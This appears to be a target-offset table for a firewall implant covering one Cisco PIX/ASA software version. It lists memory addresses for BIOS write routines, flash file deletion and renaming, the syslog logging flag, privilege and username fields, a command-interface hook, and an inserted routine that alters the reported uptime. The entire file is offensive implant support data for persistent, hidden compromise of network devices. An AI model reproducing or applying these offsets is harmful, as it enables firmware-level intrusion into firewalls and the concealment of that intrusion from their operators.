; --- SECTION I ---
;
0x40082300            // pix version
0x212f000             // address of implant configuration
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09f839c0      // addr of the bios class structure
BiosWriteAddr1            0x083a0b80      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x083a41c0      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x083a3f40      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x083a4d90      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x0847b320      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x083ade90      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x08390760      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x083ad580      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x08390440      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x0847aa10      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x0847b600      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x0847aeb0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x0847b010      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x0847c4d0      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x0930ea30      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08066a40      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x098f2920      // addr of duart/0 tty entry
CIStartFunc               0x080cbb60      // addr of the command interface start function -- telnet function
CommandListAddr           0x099d7d20      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09d988b4      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x09301910      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x0a11bec0      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000bc4      // offset into the syslog structure where the logging level is stored
Open                      0x08066c30      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x0987fb04      // Address where the thread timeout value is stored 
UpTimeCounter             0x09f6e0a8      // Address of the up time counter
Display_uptime_addr       0x080d5170      // Address of the function that display the uptime
Inserted_code_addr        0x091eed7a      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x092e7850      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x092e7a00      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080cc041      // Address of hook into the command interface
AvailMemoryPtr            0x0a0b727c      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
